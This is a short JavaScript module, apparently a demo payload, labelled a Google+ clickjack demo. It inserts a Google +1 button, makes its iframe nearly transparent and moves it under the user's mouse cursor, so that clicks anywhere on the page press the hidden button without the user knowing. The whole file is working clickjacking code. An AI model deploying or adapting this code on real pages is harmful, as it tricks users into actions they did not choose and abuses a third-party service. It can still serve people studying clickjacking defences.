var module_name = 'clickjack.js'
//A simple google+ clickjack demo.

$.getScript("http://apis.google.com/js/plusone.js");

document.title = "!!!!!!Click Jack Demo!!!!!!";

$('body').append('<g:plusone size="small"></g:plusone>');

//Run the clickjack mode

if (!document.getElementsByClassName){
    document.getElementsByClassName = function(classname){
        for (i=0; i<document.getElementsByTagName("*").length; i++)
        {  
            if (document.getElementsByTagName("*").item(i).className == classname){
                return new Array(document.getElementsByTagName("*").item(i));
            }
        }
    }
}

var twitterFollowIframe = document.getElementById('___plusone_0');

function getDivId(){
    twitterFollowIframe = document.getElementById('___plusone_0');
    if(twitterFollowIframe == null){
        setTimeout("getDivId()",200);
    }else{
        twitterFollowIframe.style.position = 'absolute';
        twitterFollowIframe.style.opacity = '0.2';
        twitterFollowIframe.style.filter = 'alpha(opacity=0)';
    }
}

getDivId();

document.onmousemove = function(e){
    if ( !e ) e = window.event;
    if(twitterFollowIframe != null){
        twitterFollowIframe.style.left = e.clientX - 15;
        twitterFollowIframe.style.top = e.clientY - 10;
    }
}
